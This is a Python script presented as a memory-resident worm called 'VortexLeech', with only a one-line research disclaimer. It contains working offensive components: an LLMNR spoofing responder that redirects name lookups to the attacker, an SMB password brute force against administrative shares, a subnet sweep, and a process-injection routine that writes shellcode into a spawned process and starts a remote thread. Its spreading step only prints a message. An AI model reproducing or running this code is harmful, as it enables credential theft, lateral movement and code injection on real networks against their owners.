# UltraX v10 - Memory-Resident Worm: VortexLeech
# NOTE: For hardened sandbox research only

import socket, struct, threading, ctypes, time, subprocess

def spoof_llmnr(interface_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((interface_ip, 5355))
    while True:
        data, addr = sock.recvfrom(1024)
        if b'\x00\x0f' in data:  # indicative of LLMNR name query
            fake_response = data[:2] + b'\x80\x00' + data[4:6] * 2 + b'\x00\x00\x00\x00'
            fake_response += data[12:] + b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
            fake_response += socket.inet_aton(interface_ip)
            sock.sendto(fake_response, addr)

def smb_brute_force(target_ip):
    # Simulated credential brute force
    creds = [("admin", "admin123"), ("user", "password")]
    for u, p in creds:
        result = subprocess.run(["smbclient", f"//{target_ip}/C$", "-U", f"{u}%{p}"], capture_output=True)
        if b"Domain" in result.stdout:
            print(f"[+] Credential success on {target_ip}: {u}:{p}")
            return (u, p)
    return None

def memory_hollow(exe_path, shellcode):
    PROCESS_ALL_ACCESS = 0x1F0FFF
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    proc = subprocess.Popen([exe_path], startupinfo=startupinfo)
    pid = proc.pid
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    addr = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(shellcode), 0x1000 | 0x2000, 0x40)
    ctypes.windll.kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), None)
    thread = ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, addr, 0, 0, None)
    return pid

def network_spread():
    subnet = "192.168.1."
    for i in range(2, 254):
        ip = f"{subnet}{i}"
        creds = smb_brute_force(ip)
        if creds:
            print(f"[!] Worm dropped on {ip} via SMB")

def live_worm():
    print("[*] VortexLeech initializing in memory-only mode...")
    threading.Thread(target=spoof_llmnr, args=("192.168.1.100",), daemon=True).start()
    threading.Thread(target=network_spread).start()
    time.sleep(300)  # live for 5 minutes
    print("[x] Self-destruct triggered. Evaporating trace.")

if __name__ == "__main__":
    live_worm()
